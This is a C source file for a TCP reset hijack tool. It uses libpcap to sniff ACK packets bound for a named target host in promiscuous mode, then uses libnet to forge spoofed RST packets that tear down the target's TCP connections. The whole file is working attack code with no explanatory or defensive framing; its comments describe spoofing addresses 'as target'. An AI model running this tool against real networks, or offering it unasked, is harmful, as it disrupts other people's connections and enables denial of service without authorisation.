#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <pcap/pcap.h>
#include <libnet.h>

unsigned long int resolve_address(char *addr){
    struct hostent *hosts;
    struct in_addr *host_addr;
    hosts  = gethostbyname(addr); // add handle for if host is null
    if(hosts == NULL) errno_die("Getting Hostname");
    host_addr = (struct in_addr *) (hosts->h_addr_list[0]);
    return host_addr->s_addr;
}

void l_die(struct libnet_context *l){
    printf("%s\n", libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
}

void errno_die(char *msg){
    perror(msg);
    exit(EXIT_FAILURE);
}

struct lib_data{
    struct libnet_context *lib_env;
};

void set_packet_filter(pcap_t *pcap_handle, struct in_addr *target){
    
    struct bpf_program filter;
    char filter_string[100];

    sprintf(filter_string, "tcp[tcpflags] & tcp-ack != 0 and dst host %s", inet_ntoa(*target));

    if (pcap_compile(pcap_handle, &filter, filter_string, 0, 0) == -1){
        errno_die("Failed to compile pcap filter");
    }

    if(pcap_setfilter(pcap_handle, &filter) == -1){
        errno_die("Failed to set compiled pcap filter");
    }
}

void caught_packet(u_char *args, const struct pcap_pkthdr *cap_header, const u_char *packet){ // may need to use bit printer to ensure that packet offset is right
    int bytes_written;
    u_char *pkt_data;
    libnet_ptag_t ip_tag;
    libnet_ptag_t tcp_tag;
    struct libnet_ipv4_hdr *ip_hdr;
    struct libnet_tcp_hdr *tcp_hdr;
    struct lib_data *l_data;

    ip_hdr = (struct libnet_ipv4_hdr *) (packet+LIBNET_ETH_H);
    tcp_hdr = (struct libnet_tcp_hdr *) (packet+LIBNET_ETH_H+LIBNET_IPV4_H);
    l_data = (struct lib_data *)args; // retrieving libnet env. from user arguments

    printf("---- CAPTURED PACKET ----\n");
    printf("\tSource IP (spoofed dest.): %s\n", inet_ntoa(ip_hdr->ip_src));
    printf("\tDestination IP (spoofed src): %s\n\n", inet_ntoa(ip_hdr->ip_dst));
    printf("\tSource port: %d\n", tcp_hdr->th_sport);
    printf("\tDestination port: %d\n", tcp_hdr->th_dport);


    printf("\n---- SPOOFING PACKET ----\n");
    /* setting libnet random seed */
    if(libnet_seed_prand(l_data->lib_env) == -1){
        l_die(l_data->lib_env);
    }

        tcp_tag = libnet_build_tcp(
        htons(tcp_hdr->th_sport), // source port
        htons(tcp_hdr->th_dport), // dest port
        libnet_get_prand(LIBNET_PRu32), // sequence number
        libnet_get_prand(LIBNET_PRu32), // ack number
        TH_RST, // control flags
        libnet_get_prand(LIBNET_PRu16), // win_size
        0, // checksum (0 for libnet to autofill)
        0, // urgent pointer
        LIBNET_TCP_H, // total length of the TCP packet (for checksum calculation)
        NULL, // payload (NULL if none)
        0, // payload len
        l_data->lib_env, // pointer to lib context
        0 // zero to create a new TCP header
    );
    if(tcp_tag < 0){
        printf("\t[WARNING] failure to build TCP header\n");
        printf("\t[REASON] %s\n", libnet_geterror(l_data->lib_env));
    }
    
     /* Building IPv4 Header */
    ip_tag = libnet_build_ipv4( 
        LIBNET_IPV4_H+LIBNET_TCP_H, // len of ip hdr and subsequent data
        IPTOS_LOWDELAY, // TOS
        libnet_get_prand(LIBNET_PRu16), // IP ID
        0, // no fragments
        libnet_get_prand(LIBNET_PR8), // TTL
        IPPROTO_TCP, // upper layer protocol (TCP)
        0, // checksum (0 for libnet to do it for you)
        htonl(ip_hdr->ip_dst.s_addr), // src ip, set to captured dest addr. to spoof as target
        htonl(ip_hdr->ip_src.s_addr), // dest ip
        NULL, // payload (NULL)
        0, // payload len
        l_data->lib_env, // libnet context
        0 // create a new ipv4 packet
    );

    if(ip_tag < 0){
        printf("\t[WARNING] failure to build TCP header\n");
        printf("\t[REASON] %s\n", libnet_geterror(l_data->lib_env));
    }
    bytes_written = libnet_write(l_data->lib_env);
    if(bytes_written < 0){
        printf("\t[ERROR] Sending rst packet\n");
        l_die(l_data->lib_env);
    }
    if(bytes_written < LIBNET_IPV4_H+LIBNET_TCP_H){
        printf("\t[WARNING] Incomplete packet sent %d/%d\n", bytes_written, LIBNET_IPV4_H+LIBNET_TCP_H);
        printf("\t[REASON] %s\n", libnet_geterror(l_data->lib_env));
    }
    printf("\t%d byte packet sent\n", bytes_written);
    usleep(5000); // small pause
}


int main(int argc, char *argv[]){
    if(argc < 1){
        printf("usage %s:\n\t%s <target host>\n", argv[0], argv[0]);
        exit(EXIT_FAILURE);
    }


    struct pcap_pkthdr *cap_header;
    const u_char *packet, *pkt_data;
    pcap_t *pcap_handle;

    char p_err_buff[PCAP_ERRBUF_SIZE];
    char l_err_buff[LIBNET_ERRBUF_SIZE];
    char *device;
    u_long target_ip;
    int network;
    struct lib_data l_data;

    target_ip = resolve_address(argv[1]);

    device = pcap_lookupdev(p_err_buff);
    if(device == NULL){
        errno_die(p_err_buff);
    }
    printf("Sniffing on device: %s", device);

    /* accessing network interface and setting to promiscuous mode for packet sniffing */
    pcap_handle = pcap_open_live(device, 128, 1, 0, p_err_buff);
    if(pcap_handle == NULL){
        errno_die(p_err_buff);
    }

    l_data.lib_env = libnet_init(LIBNET_RAW4, device, l_err_buff);
    if(l_data.lib_env == NULL){
        errno_die("Initializing libnet enviroment");
    }

    set_packet_filter(pcap_handle, (struct in_addr *)&target_ip);

    printf("---- Launching reset hijack on %s across %s ----\n", argv[1], device);
    pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&l_data);

    pcap_close(pcap_handle);
}
